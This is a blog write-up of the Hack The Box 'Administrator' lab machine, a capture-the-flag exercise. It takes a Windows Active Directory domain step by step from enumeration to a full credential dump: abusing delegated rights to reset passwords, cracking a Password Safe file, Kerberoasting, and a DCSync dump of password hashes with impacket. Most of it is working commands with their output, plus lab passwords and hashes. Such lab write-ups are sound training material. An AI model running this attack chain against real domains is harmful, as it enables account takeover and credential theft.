---
title: Administator HackTheBox
date: 2025-02-13 15:40:00 +0700
layout: post
categories:
  - Hack The Box
tags:
  - writeups
  - ctf
  - medium
  - hackthebox
  - windows
image: 
    path: /assets/img/sample/administrator/demo.jpg
    alt: Adminstrator Machine HackTheBox
---


## Introdution

This box focuses on Active Directory exploitation, Crack passwords techniques. You will start the Administrator box with credentials for the following account:
- Username: __Olivia__
- Password: __ichliebedich__

> You need add `10.10.11.42    administrator` into `/etc/hosts` file.
{: .prompt-warning }


## Enumeration

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ nmap -A -sC -sV 10.10.11.42  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 01:22 EST
Nmap scan report for 10.10.11.42
Host is up (0.046s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 13:05:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/13%OT=21%CT=1%CU=32609%PV=Y%DS=2%DC=T%G=Y%TM=67AD8FB
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=
OS:A)SEQ(SP=102%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=103%GCD=1%ISR
OS:=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=103%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS
OS:=S%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M552NW8
OS:ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M55
OS:2ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T
OS:=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T
OS:2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O
OS:%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-13T13:05:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h43m05s

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   65.14 ms 10.10.14.1
2   65.25 ms 10.10.11.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.06 seconds
~~~

List users in the domain using the provided credential above __Olivia__ / __ichliebedich__


~~~ shell 

┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ crackmapexec smb 10.10.11.42 -u "Olivia" -p "ichliebedich" --rid-brute | grep SidTypeUser
SMB                      10.10.11.42     445    DC               500: ADMINISTRATOR\Administrator (SidTypeUser)
SMB                      10.10.11.42     445    DC               501: ADMINISTRATOR\Guest (SidTypeUser)
SMB                      10.10.11.42     445    DC               502: ADMINISTRATOR\krbtgt (SidTypeUser)
SMB                      10.10.11.42     445    DC               1000: ADMINISTRATOR\DC$ (SidTypeUser)
SMB                      10.10.11.42     445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)
SMB                      10.10.11.42     445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)
SMB                      10.10.11.42     445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)
SMB                      10.10.11.42     445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)
SMB                      10.10.11.42     445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
SMB                      10.10.11.42     445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
SMB                      10.10.11.42     445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)
~~~

Using the `bloodhound-python` tool to collect data from Active Directory.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ bloodhound-python -u 'Olivia'  -p 'ichliebedich' -d administrator.htb -ns 10.10.11.42 -c All 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 09S
~~~

> You need add `10.10.11.42    administrator    dc.administrator.htb    ` into `/etc/hosts` file.
{: .prompt-warning }

I used `bloodhound GUI` import `.json` file I collected in the step above and got the following information.

__Olivia__ has `GenericAll` rights to __Michael__. 

![](/assets/img/sample/administrator/olliva.png)

__Michael__ has `ForceChangePassword` rights to __Benjamin__.

![](/assets/img/sample/administrator/bẹnamin.png)


Because _Olivia__ has `GenericAll` rights to __Michael__, so try changing __Michael's__ password.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ bloodyAD -u 'Olivia' -p 'ichliebedich' -d 'administrator.htb' --host 10.10.11.42 set password 'Michael' '111222333'
[+] Password changed successfully!
~~~ 

Because __Michael__ has `ForceChangePassword` rights to __Benjamin__, so try changing __Benjamin's__ password.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ bloodyAD -u 'Michael' -p '111222333' -d 'administrator.htb' --host 10.10.11.42 set password 'Benjamin' '111222333'
[+] Password changed successfully!
~~~

Login ftp with __Benjamin__/__111222333__ credential and get file __Backup.psafe3__.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:trit): Benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||57450|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||57453|)
125 Data connection already open; Transfer starting.
100% |**************************|   952       18.80 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (18.70 KiB/s) 
~~~

> **.psafe3** is the database file of Password Safe, an open source password manager. It's maybe contains username, passwords,...
{: .prompt-tip }

## Crack Passwords

Get a hash from file **Backup.psafe3** using [this website](https://hashes.com/en/johntheripper/pwsafe2john) or use the following command: 

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ pwsafe2john Backup.psafe3              
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
~~~
Add hash into `psafe3.hash` file.

~~~ 
$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
~~~



Then I cracked the hash.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ john psafe3.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /home/trit/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (?)     
1g 0:00:00:00 DONE (2025-02-13 02:16) 1.204g/s 9869p/s 9869c/s 9869C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

Open the file **Backup.psafe3** using `Password` with the password of **Benjamin** just cracked in the step above. If you not installed `Password Safe` yet, run the following command:

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ sudo apt install passwordsafe
~~~

![](/assets/img/sample/administrator/copy_password.png)

We have some credentials.
~~~
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
~~~

## Get User Flag

Notice line **5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)** in result `nmap` scan, so I used tool `evil-winrm` login.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$  evil-winrm -i administrator.htb -u alexander -p "UrkIbagoxMyUGw0aPlj9B0AXSea4Sw" 


                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
                                                                                                                                                 
                                                                                                                                                 
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$  evil-winrm -i administrator.htb -u emma -p "WwANQWnmJnGV07WQN8bMS7FMAbjNur"


                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../Desktop 
*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
fcf79459c6*****416a2469fae820b26
*Evil-WinRM* PS C:\Users\emily\Desktop> 
~~~

## Get Root Flag

Emily has permission **GenericWrite** to **Ethan** user, so I used a technique called `Kerberoasting`. An attack technique in Active Directory (AD), to extract and crack service tickets (TGS - Ticket Granting Service) to get the password of the service account (Service Account).

> If you are getting "Clock skew too great" error because there is a time difference between the attacker machine and the target machine. Following the step to fix it.
{: .prompt-tip }

- If you are not currently running as the root user, switch to the root user by running the `sudo su` command.
- Run `timedatectl set-ntp off` to disable the Network Time Protocol from auto-updating.
- Run `rdate -n $IP` to match your date and time with the date and time of the your target machine.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.10.11.42
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                                                                                                 
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ sudo su 
[sudo] password for trit: 
┌──(root㉿chimp)-[/home/trit/HackTheBox/Administrator]
└─# timedatectl set-ntp off
                                                                                                                                                 
┌──(root㉿chimp)-[/home/trit/HackTheBox/Administrator]
└─# rdate -n 10.10.11.42
Thu Feb 13 09:39:08 EST 2025
                                                                                                                                                 
┌──(root㉿chimp)-[/home/trit/HackTheBox/Administrator]
└─# python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.10.11.42
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$66d7754c62e3699d1465de852482a952$a4681610fe117805d53f6ebc91170a527754bec926358fd1e626fde9e0d9c3c67208411292d4f393c78bf36835dde288bb7b00414a78a908afe7ffd9a349d9dc398e1e8d344a6e1a2247c8e0129328c5795d1892c9f2c19adcaab10da49195796d0bdb9bdc3f273d69d52628cb63b6cec942d67e296035816ca1f0f94b885dcfbc287b5e1563728feef261a715db5807e813b06c7bc33acb09f3e7f0c23cde5917cd872e909ec0c8df70fafb5d9af2563803dfa5c6e5057cfffc9a164ec2c06bc8d7b49a8830f928adc084840210f5da22429a5ea7a7db1f69c0cc72dd16b962dd60ebded2af139cc5a4ecb21c211f85d15ebf6d8d4d9e34fc7e9ad3b3756fb90053aaf546e708c44235d05dce0898ca7b707c7b49b944761a8c989121cfa6690919a0fa72c5987aff28009637b2e311e8280fc4cc740073a95623807a71b17fb8b56fd51737c9718abc14ea5fe0cd02beb0bdb475c16324d8da26765fc44efea205f661581e4f8745c3828d73c960128dc89ac51925390330a86d565fb44f124969403c6a523e0844198cb0437ba05fd43221c7ee0e303a0ebcfde2c9bdc15a9e4f2257bdbc00dfdf992eb626d47783730ae429acb80ae2e6582b55e8c99053f08f8ad3197cf3c0003824a8a7f0c65bb86b70e0e5a44879acc1bfcd923319bdcbee7fde1bb6c72231b109b7bd2942f3fd7c65f01a2fcf9fdd3db80526f54e3d7b3f353f3c12328fbf1549651028325e073a43250f3c0d21710fe0049fcc16dee77aef8d571629c005921fc75a146e6dda5e180b335db39d470fa85ac9541ea7d5184c4553e555493ec8a2cbf1bcbd60ccc00bd4356799905cc8dd633d2573a409846cde4e0dbff8ed07303f0fa2ccd7632b073e1b161b451c69df5fff22487ee6253ad081701bddbf0ffb41f820468d9047be9624429cafd8cf94867d7d09ec3fb52d35ad883bfac8d14ee8713bc417bf2da686943bc9e2ed77fd94bcd1ac8d9d767261ac8f817b0a328bd6212c3448c644f41f32333e03e9b158bb29cfa914aeb2d2add9954d2a0ff072556c9a8750eaf0383092665b8143a1b736eeb62cce534aa496a55d06b31971fe7001295f5efcdeda9732dbc18a87da53b100d46e73d9e3bd45863c24564532d8f4bf230b3b56575e5160857ac125ed93531e530b1f410f7ad24ac02f530bd9f490a35bddd48c2f8b714d1bd5425692dcf61dff76d736d0d0023fcc4cd6d8209e8452b90800ba1cb8c553ad28d703e9956bad04457da81e72e740f960d1c8788c3b5fe3dfb0a099b21cb7f2b5383c933acbcdd454f19b01e41d9745c6cd20dc2d70f2bc27ac4ce2dbd74af157cd0281dea750f29ba2dd6e1c4180a3c908321d38e2ed1a0ef0cf959b34167b0721199dcdee6d795d880ea82429b05edffa2268537b09afd277dcd343430084fb1304f03c3fc05b7fc1cfd55958d8ca56ac03b889c32f8151425bbad6a028985ebc14b78ff7c66317e1868d0a717e3bd8566456f8ccd1ac8d00563329a81e1b729aa6c0457dc6deca
~~~
Find hash ![this website](https://nth.skerritt.blog/).

![](/assets/img/sample/administrator/find_hash.png)

Add hash into **hash.txt** file.

~~~ 
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$66d7754c62e3699d1465de852482a952$a4681610fe117805d53f6ebc91170a527754bec926358fd1e626fde9e0d9c3c67208411292d4f393c78bf36835dde288bb7b00414a78a908afe7ffd9a349d9dc398e1e8d344a6e1a2247c8e0129328c5795d1892c9f2c19adcaab10da49195796d0bdb9bdc3f273d69d52628cb63b6cec942d67e296035816ca1f0f94b885dcfbc287b5e1563728feef261a715db5807e813b06c7bc33acb09f3e7f0c23cde5917cd872e909ec0c8df70fafb5d9af2563803dfa5c6e5057cfffc9a164ec2c06bc8d7b49a8830f928adc084840210f5da22429a5ea7a7db1f69c0cc72dd16b962dd60ebded2af139cc5a4ecb21c211f85d15ebf6d8d4d9e34fc7e9ad3b3756fb90053aaf546e708c44235d05dce0898ca7b707c7b49b944761a8c989121cfa6690919a0fa72c5987aff28009637b2e311e8280fc4cc740073a95623807a71b17fb8b56fd51737c9718abc14ea5fe0cd02beb0bdb475c16324d8da26765fc44efea205f661581e4f8745c3828d73c960128dc89ac51925390330a86d565fb44f124969403c6a523e0844198cb0437ba05fd43221c7ee0e303a0ebcfde2c9bdc15a9e4f2257bdbc00dfdf992eb626d47783730ae429acb80ae2e6582b55e8c99053f08f8ad3197cf3c0003824a8a7f0c65bb86b70e0e5a44879acc1bfcd923319bdcbee7fde1bb6c72231b109b7bd2942f3fd7c65f01a2fcf9fdd3db80526f54e3d7b3f353f3c12328fbf1549651028325e073a43250f3c0d21710fe0049fcc16dee77aef8d571629c005921fc75a146e6dda5e180b335db39d470fa85ac9541ea7d5184c4553e555493ec8a2cbf1bcbd60ccc00bd4356799905cc8dd633d2573a409846cde4e0dbff8ed07303f0fa2ccd7632b073e1b161b451c69df5fff22487ee6253ad081701bddbf0ffb41f820468d9047be9624429cafd8cf94867d7d09ec3fb52d35ad883bfac8d14ee8713bc417bf2da686943bc9e2ed77fd94bcd1ac8d9d767261ac8f817b0a328bd6212c3448c644f41f32333e03e9b158bb29cfa914aeb2d2add9954d2a0ff072556c9a8750eaf0383092665b8143a1b736eeb62cce534aa496a55d06b31971fe7001295f5efcdeda9732dbc18a87da53b100d46e73d9e3bd45863c24564532d8f4bf230b3b56575e5160857ac125ed93531e530b1f410f7ad24ac02f530bd9f490a35bddd48c2f8b714d1bd5425692dcf61dff76d736d0d0023fcc4cd6d8209e8452b90800ba1cb8c553ad28d703e9956bad04457da81e72e740f960d1c8788c3b5fe3dfb0a099b21cb7f2b5383c933acbcdd454f19b01e41d9745c6cd20dc2d70f2bc27ac4ce2dbd74af157cd0281dea750f29ba2dd6e1c4180a3c908321d38e2ed1a0ef0cf959b34167b0721199dcdee6d795d880ea82429b05edffa2268537b09afd277dcd343430084fb1304f03c3fc05b7fc1cfd55958d8ca56ac03b889c32f8151425bbad6a028985ebc14b78ff7c66317e1868d0a717e3bd8566456f8ccd1ac8d00563329a81e1b729aa6c0457dc6deca
~~~


I use `hashcat` tool to crack password faster because my computer has a pretty strong GPU, if your GPU is weak you can use `john` tool.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --optimized-kernel-enable

hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 3826/7716 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$66d7754c62e3699d1465de852482a952$a4681610fe117805d53f6ebc91170a527754bec926358fd1e626fde9e0d9c3c67208411292d4f393c78bf36835dde288bb7b00414a78a908afe7ffd9a349d9dc398e1e8d344a6e1a2247c8e0129328c5795d1892c9f2c19adcaab10da49195796d0bdb9bdc3f273d69d52628cb63b6cec942d67e296035816ca1f0f94b885dcfbc287b5e1563728feef261a715db5807e813b06c7bc33acb09f3e7f0c23cde5917cd872e909ec0c8df70fafb5d9af2563803dfa5c6e5057cfffc9a164ec2c06bc8d7b49a8830f928adc084840210f5da22429a5ea7a7db1f69c0cc72dd16b962dd60ebded2af139cc5a4ecb21c211f85d15ebf6d8d4d9e34fc7e9ad3b3756fb90053aaf546e708c44235d05dce0898ca7b707c7b49b944761a8c989121cfa6690919a0fa72c5987aff28009637b2e311e8280fc4cc740073a95623807a71b17fb8b56fd51737c9718abc14ea5fe0cd02beb0bdb475c16324d8da26765fc44efea205f661581e4f8745c3828d73c960128dc89ac51925390330a86d565fb44f124969403c6a523e0844198cb0437ba05fd43221c7ee0e303a0ebcfde2c9bdc15a9e4f2257bdbc00dfdf992eb626d47783730ae429acb80ae2e6582b55e8c99053f08f8ad3197cf3c0003824a8a7f0c65bb86b70e0e5a44879acc1bfcd923319bdcbee7fde1bb6c72231b109b7bd2942f3fd7c65f01a2fcf9fdd3db80526f54e3d7b3f353f3c12328fbf1549651028325e073a43250f3c0d21710fe0049fcc16dee77aef8d571629c005921fc75a146e6dda5e180b335db39d470fa85ac9541ea7d5184c4553e555493ec8a2cbf1bcbd60ccc00bd4356799905cc8dd633d2573a409846cde4e0dbff8ed07303f0fa2ccd7632b073e1b161b451c69df5fff22487ee6253ad081701bddbf0ffb41f820468d9047be9624429cafd8cf94867d7d09ec3fb52d35ad883bfac8d14ee8713bc417bf2da686943bc9e2ed77fd94bcd1ac8d9d767261ac8f817b0a328bd6212c3448c644f41f32333e03e9b158bb29cfa914aeb2d2add9954d2a0ff072556c9a8750eaf0383092665b8143a1b736eeb62cce534aa496a55d06b31971fe7001295f5efcdeda9732dbc18a87da53b100d46e73d9e3bd45863c24564532d8f4bf230b3b56575e5160857ac125ed93531e530b1f410f7ad24ac02f530bd9f490a35bddd48c2f8b714d1bd5425692dcf61dff76d736d0d0023fcc4cd6d8209e8452b90800ba1cb8c553ad28d703e9956bad04457da81e72e740f960d1c8788c3b5fe3dfb0a099b21cb7f2b5383c933acbcdd454f19b01e41d9745c6cd20dc2d70f2bc27ac4ce2dbd74af157cd0281dea750f29ba2dd6e1c4180a3c908321d38e2ed1a0ef0cf959b34167b0721199dcdee6d795d880ea82429b05edffa2268537b09afd277dcd343430084fb1304f03c3fc05b7fc1cfd55958d8ca56ac03b889c32f8151425bbad6a028985ebc14b78ff7c66317e1868d0a717e3bd8566456f8ccd1ac8d00563329a81e1b729aa6c0457dc6deca:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....c6deca
Time.Started.....: Thu Feb 13 09:47:43 2025, (0 secs)
Time.Estimated...: Thu Feb 13 09:47:43 2025, (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   458.4 kH/s (1.92ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou
Hardware.Mon.#1..: Util: 26%

Started: Thu Feb 13 09:47:13 2025
Stopped: Thu Feb 13 09:47:45 2025

~~~

Extract NTLM hash, LM Hash, plaintext password of user from Active Directory.

![](/assets/img/sample/administrator/attack_hash.png)

You can read [here](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync).


~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ impacket-secretsdump  -outputfile 'secer.txt' 'adminstrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:b66b458e27bd714f99a05ee3c479fbf1:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:b66b458e27bd714f99a05ee3c479fbf1:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:2617cee839662abb3cbeafda2b97b49c53d8bc5446f0b28f857d7ca3fa89debe
administrator.htb\michael:aes128-cts-hmac-sha1-96:882609050cacbbcb53179b3d797d4796
administrator.htb\michael:des-cbc-md5:bad60ee30b85f458
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:7dfaaf5f83e95a7ee4ec86fc3051eb3855e7c2e812cc405723cc3a4b5c90ab12
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:80af65300f482202f08809150a31bbfb
administrator.htb\benjamin:des-cbc-md5:6bdf34457ffd976d
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
